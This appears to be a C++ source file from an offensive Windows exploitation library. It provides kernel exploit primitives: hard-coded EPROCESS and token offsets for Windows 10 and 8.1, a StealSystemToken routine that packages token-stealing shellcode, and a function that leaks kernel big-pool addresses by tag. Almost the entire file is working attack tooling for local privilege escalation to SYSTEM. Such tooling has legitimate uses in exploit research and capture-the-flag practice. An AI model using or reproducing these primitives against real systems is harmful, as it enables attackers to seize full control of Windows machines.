#include "kernel.hpp"

#include <stdexcept>

#include "asm.hpp"
#include "log.hpp"
#include "nt.hpp"

#pragma comment(lib, "ntdll.lib")

using namespace pwn::log;


#ifndef __KERNEL_CONSTANTS__
#define __KERNEL_CONSTANTS__

// clang-format off
// TODO: use a json file with those autogen values at compile time
#if PWN_BUILD_FOR_WINDOWS == 10
//
// Offset for Win10 RS6 x64
//
#  define CURRENT_ETHREAD       0x0188
#  define EPROCESS_OFFSET       0x00b8
#  define PROCESSID_OFFSET      0x02e8
#  define EPROCESS_FLINK_OFFSET 0x02f0
#  define TOKEN_OFFSET          0x0360
#  define SYSTEM_PID            4

#elif PWN_BUILD_FOR_WINDOWS == 81
#  define CURRENT_ETHREAD      0x0188
#  define EPROCESS_OFFSET      0x00b8
#  define PROCESSID_OFFSET     0x02e0
#  define FLINK_OFFSET         0x02e8
#  define TOKEN_OFFSET         0x0348
#  define SYSTEM_PID           0x4

#else
#error "unsupported os"
#endif

#endif
// clang-format on


EXTERN_C_START

void
CopySystemToken();

usize
CopySystemTokenLength();

EXTERN_C_END


namespace pwn::windows
{

std::vector<u8>
Kernel::Shellcode::DebugBreak()
{
    return std::vector<u8>({0x90, 0x90, 0xcc, 0xcc});
}


std::vector<u8>
Kernel::Shellcode::StealSystemToken()
{
    const usize sz = CopySystemTokenLength();
    std::vector<u8> sc(sz);
    RtlCopyMemory(sc.data(), &CopySystemToken, sz);
    return sc;
}


Result<std::vector<uptr>>
KFindBigPoolAddressesFromTag(const u32 Tag)
{
    auto res = System::Query<SYSTEM_BIGPOOL_INFORMATION>(SystemBigPoolInformation);
    if ( Failed(res) )
    {
        return Err(ErrorCode::ExternalApiCallFailed);
    }

    std::vector<uptr> Pools;
    auto BigPoolInfo = Value(res);

    std::for_each(
        std::next(BigPoolInfo->AllocatedInfo, 0),
        std::next(BigPoolInfo->AllocatedInfo, BigPoolInfo->Count),
        [&Pools, &Tag](auto const& P)
        {
            if ( P.TagUlong == Tag )
            {
                Pools.push_back((uptr)P.VirtualAddress);
            }
        });

    return Pools;
}

} // namespace pwn::windows
